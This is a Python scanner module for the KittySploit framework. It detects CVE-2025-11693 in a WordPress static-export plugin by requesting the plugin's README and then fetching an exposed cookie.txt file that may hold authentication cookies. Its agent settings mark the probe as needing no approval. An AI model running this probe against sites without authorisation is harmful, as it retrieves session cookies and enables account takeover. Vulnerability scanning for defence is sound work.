#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Export WP Page to Static HTML & PDF WordPress plugin <= 4."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Export WP Page to Static HTML <= 4.3.4 - Cookie Exposure Detection',
        'description': 'Export WP Page to Static HTML & PDF WordPress plugin <= 4.3.4 contains a sensitive information exposure caused by publicly exposed cookies.txt files with authentication cookies, letting unauthenticated attackers access sensitive authentication data, exploit requires site administrator to trigger backup with specific user role.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2025', 'wordpress', 'wp', 'wp-plugin', 'export-wp-page-to-static-html', 'exposure'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/export-wp-page-to-static-html/export-wp-page-to-static-html-pdf-434-unauthenticated-cookie-exposure-via-log-file',
            'https://nvd.nist.gov/vuln/detail/CVE-2025-11693',
        ],
        'cve': 'CVE-2025-11693',
    }

    def run(self):
        path = '/wp-content/plugins/export-wp-page-to-static-html/README.txt'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('Export WP Page',)
        if not (any(m in body for m in body_any)):
            return False
        path = '/wp-content/uploads/exported_html_files/cookie.txt'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('wordpress',)
        if any(m in body for m in body_any):
            self.set_info(severity='critical', reason='Export WP Page to Static HTML <= 4.3.4 - Cookie Exposure detected', path=path)
            return True
        return False

